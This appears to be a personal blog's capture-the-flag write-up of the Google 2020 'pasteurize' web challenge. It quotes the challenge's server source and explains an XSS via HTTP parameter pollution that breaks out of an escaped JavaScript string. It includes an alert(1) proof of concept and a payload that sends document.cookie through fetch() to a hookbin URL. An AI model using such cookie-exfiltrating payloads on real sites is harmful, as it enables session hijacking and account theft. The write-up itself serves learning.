---
id: 296
title: 'Google 2020 CTF - Web Challenge'
date: '2020-11-13T11:18:48+00:00'
author: admin
layout: post
guid: 'https://embed-me.com/?p=296'
permalink: /google-2020-ctf-web-challenge/
wp_featherlight_disable:
    - ''
categories:
    - CTF
tags:
    - '2020'
    - capturetheflag
    - cookie
    - ctf
    - google
    - webhacking
    - XSS
---

## Intro

![_config.yml]({{ site.baseurl }}/images/google_2020_ctf_web/google_ctf_banner.png)

In my previous [post ](https://embed-me.github.io/google-2020-ctf-hardware-challenge/)about the google 2020 CTF Challenge, everything was focused on a hardware description language. Since I enjoyed it so much, I decided to give another challenge a try. About half a year ago I read the classic book [Web Application Hacker’s Handbook](https://www.goodreads.com/book/show/1914619.The_Web_Application_Hacker_s_Handbook?from_search=true&from_srp=true&qid=tmgHIXc3R3&rank=1) from the makers of [Burpsuite ](https://portswigger.net/burp)– Dafydd Stuttard and Marcus Pinto. Therefore I decided to go for the beginners web challenge this time.

## The Challenge

![_config.yml]({{ site.baseurl }}/images/google_2020_ctf_web/google_ctf_overview-1.png)

First of all, let’s fool around a little bit and find out what the page <https://pasteurize.web.ctfcompetition.com/> is all about. In summary what we can do is:

- Create new pastes
- Submit pastes, they are then reflected to us
- Make TJMike read our pastes using “share with TJMike🎤”

Below a simple example of the text “foo” being pasted.

![_config.yml]({{ site.baseurl }}/images/google_2020_ctf_web/share_with_TJMike.png)

This already smells like XSS, but before jumping to wild conclusions let’s have a look at the source code of the site. One thing that immediately got my attention is the following comment:

``` javascript
HTML Source
<!-- TODO: Fix b/1337 in /source that could lead to XSS -->
```

It confirms our initial assumption and also indicates that there is a document “source” hosted. Forceful browsing is our friend: <https://pasteurize.web.ctfcompetition.com/source>

The source code that can be found looks as follows.

``` javascript
const express = require('express');
const bodyParser = require('body-parser');
const utils = require('./utils');
const Recaptcha = require('express-recaptcha').RecaptchaV3;
const uuidv4 = require('uuid').v4;
const Datastore = require('@google-cloud/datastore').Datastore;

/* Just reCAPTCHA stuff. */
const CAPTCHA_SITE_KEY = process.env.CAPTCHA_SITE_KEY || 'site-key';
const CAPTCHA_SECRET_KEY = process.env.CAPTCHA_SECRET_KEY || 'secret-key';
console.log("Captcha(%s, %s)", CAPTCHA_SECRET_KEY, CAPTCHA_SITE_KEY);
const recaptcha = new Recaptcha(CAPTCHA_SITE_KEY, CAPTCHA_SECRET_KEY, {
  'hl': 'en',
  callback: 'captcha_cb'
});

/* Choo Choo! */
const app = express();
app.set('view engine', 'ejs');
app.set('strict routing', true);
app.use(utils.domains_mw);
app.use('/static', express.static('static', {
  etag: true,
  maxAge: 300 * 1000,
}));

/* They say reCAPTCHA needs those. But does it? */
app.use(bodyParser.urlencoded({
  extended: true
}));

/* Just a datastore. I would be surprised if it's fragile. */
class Database {
  constructor() {
    this._db = new Datastore({
      namespace: 'littlethings'
    });
  }
  add_note(note_id, content) {
    const note = {
      note_id: note_id,
      owner: 'guest',
      content: content,
      public: 1,
      created: Date.now()
    }
    return this._db.save({
      key: this._db.key(['Note', note_id]),
      data: note,
      excludeFromIndexes: ['content']
    });
  }
  async get_note(note_id) {
    const key = this._db.key(['Note', note_id]);
    let note;
    try {
      note = await this._db.get(key);
    } catch (e) {
      console.error(e);
      return null;
    }
    if (!note || note.length < 1) {
      return null;
    }
    note = note[0];
    if (note === undefined || note.public !== 1) {
      return null;
    }
    return note;
  }
}

const DB = new Database();

/* Who wants a slice? */
const escape_string = unsafe => JSON.stringify(unsafe).slice(1, -1)
  .replace(/</g, '\\x3C').replace(/>/g, '\\x3E');

/* o/ */
app.get('/', (req, res) => {
  res.render('index');
});

/* \o/ [x] */
app.post('/', async (req, res) => {
  const note = req.body.content;
  if (!note) {
    return res.status(500).send("Nothing to add");
  }
  if (note.length > 2000) {
    res.status(500);
    return res.send("The note is too big");
  }

  const note_id = uuidv4();
  try {
    const result = await DB.add_note(note_id, note);
    if (!result) {
      res.status(500);
      console.error(result);
      return res.send("Something went wrong...");
    }
  } catch (err) {
    res.status(500);
    console.error(err);
    return res.send("Something went wrong...");
  }
  await utils.sleep(500);
  return res.redirect(`/${note_id}`);
});

/* Make sure to properly escape the note! */
app.get('/:id([a-f0-9\-]{36})', recaptcha.middleware.render, utils.cache_mw, async (req, res) => {
  const note_id = req.params.id;
  const note = await DB.get_note(note_id);

  if (note == null) {
    return res.status(404).send("Paste not found or access has been denied.");
  }

  const unsafe_content = note.content;
  const safe_content = escape_string(unsafe_content);

  res.render('note_public', {
    content: safe_content,
    id: note_id,
    captcha: res.recaptcha
  });
});

/* Share your pastes with TJMike */
app.post('/report/:id([a-f0-9\-]{36})', recaptcha.middleware.verify, (req, res) => {
  const id = req.params.id;

  /* No robots please! */
  if (req.recaptcha.error) {
    console.error(req.recaptcha.error);
    return res.redirect(`/${id}?msg=Something+wrong+with+Captcha+:(`);
  }

  /* Make TJMike visit the paste */
  utils.visit(id, req);

  res.redirect(`/${id}?msg=TJMike🎤+will+appreciate+your+paste+shortly.`);
});

/* This is my source I was telling you about! */
app.get('/source', (req, res) => {
  res.set("Content-type", "text/plain; charset=utf-8");
  res.sendFile(__filename);
});

/* Let it begin! */
const PORT = process.env.PORT || 8080;

app.listen(PORT, () => {
  console.log(`App listening on port ${PORT}`);
  console.log('Press Ctrl+C to quit.');
});

module.exports = app;
```

The leaked source code gives us perfect insight what’s going on on the server side:

1. The Server makes use of the Node.js framework Express, reCAPTCHA and a Database to store and get notes
2. The notes provided are stringified, sliced and escaped (\\&lt; and \\&gt; will be replaced with hexadecimal \\\\x3C and \\\\x3E)
3. The note will be stored in the database
4. We are redirected to a page with the note id
5. The note is fetched from the database
6. Finally the note is provided to note\_public (note\_public.ejs) and is rendered

The rendered code on the client side than looks as follows:

``` javascript
const note = "foo";
const note_id = "a969ba60-78b9-45cf-8bd2-9bf159be1fa8";
const note_el = document.getElementById('note-content');
const note_url_el = document.getElementById('note-title');
const clean = DOMPurify.sanitize(note);
note_el.innerHTML = clean;
note_url_el.href = `/${note_id}`;
note_url_el.innerHTML = `${note_id}`;
```

…we can break it down to:

1. The content of our note (“foo”) is part of the script section
2. The note is then sanitized using [DOMPurify](https://github.com/cure53/DOMPurify)
3. Finally the cleaned result is added to the innerHTML and is therefore visible in the browser

At first I tried to enter some simple HTML and was surprised that the result in the browser was indeed **bold**.

``` html
<b>foo</b>
```

However, due to DOMPurify.sanitized() the following snipped and multiple more with higher complexity were filtered.

``` html
<script>alert(1);</script>
```

After some time I gave up and decided to try another attack vector that we identified – Our note becomes part of the rendered code (see above). Furthermore note that the body-parser explicitly enables extended urlencoding on the server side. [This allows us to pass array like objects](https://github.com/expressjs/body-parser#extended)!

``` javascript
app.use(bodyParser.urlencoded({
  extended: true
}));
```

## Attack Vector

Let’s think about what happens when we try HTTP Parameter Pollution. We send multiple parameters with the same name in one request, so that the server-side API will form a list of the parameters.

The variable provided to the backend code from the post request will look as follows:

``` javascript
a[]=";alert(1);"
```

…which is then interpreted as a list and stringified to…

``` javascript
'[";alert(1);"]'
```

and after slicing the squared brackets of the list…

``` javascript
escape_string = '";alert(1);"'
```

The code in the browser has unescaped brackets that will become part of the code and therefore we break out of the string and are able to provide our own javascript code to execute.

``` javascript
const note = ""; alert(1); "";
```

The following table shows the type and object before- and after sanitization.

|---|---|---|
| Typeof | object | string |
| Object | \[ ‘alert(1);’ \] | “alert(1);” |

In order to proof our theory, we need to create a new paste with our payload.

![_config.yml]({{ site.baseurl }}/images/google_2020_ctf_web/exploit_poc.png)

Second, we need to make sure the transmitted value is of type List, either by providing multiple values with the same name or by using this neat trick that I spotted by [gynvael](https://gynvael.coldwind.pl/).

![_config.yml]({{ site.baseurl }}/images/google_2020_ctf_web/source_code_post_content_modified.png)

When we provide the above payload, the alert method will be executed and will show up in the browser. From there on we can move to exploitation

![_config.yml]({{ site.baseurl }}/images/google_2020_ctf_web/exploit_poc_executed.png)

## Exploitation

Since we do not know what to get, my initial guess is to go for [document.cookie](https://javascript.info/cookie) of the TJMike.

In my first attempt I tried to smuggle the cookie within a subdomain name and a forced redirect, however, was not successful. I ended up using [hookbin.com](https://hookbin.com/) in combination with the [fetch method](https://javascript.info/fetch) to smuggle the cookie out using a simple get request.

``` javascript
;var p='https://hookb.in/pzygbrk11oSXNNqwanwe?q='+document.cookie;fetch(p);
```

Looking through the requests in hookbin, the only think we need to do is look for TJMike’s response and grab the flag from the query string!

``` bash
secret=CTF{Expr*********ubl3s}
```

This was also a lot of fun! Not to hard, but for me as a beginner this challenge marked as “easy” was definitely not a piece of cake.

Let me know what’s your opinion.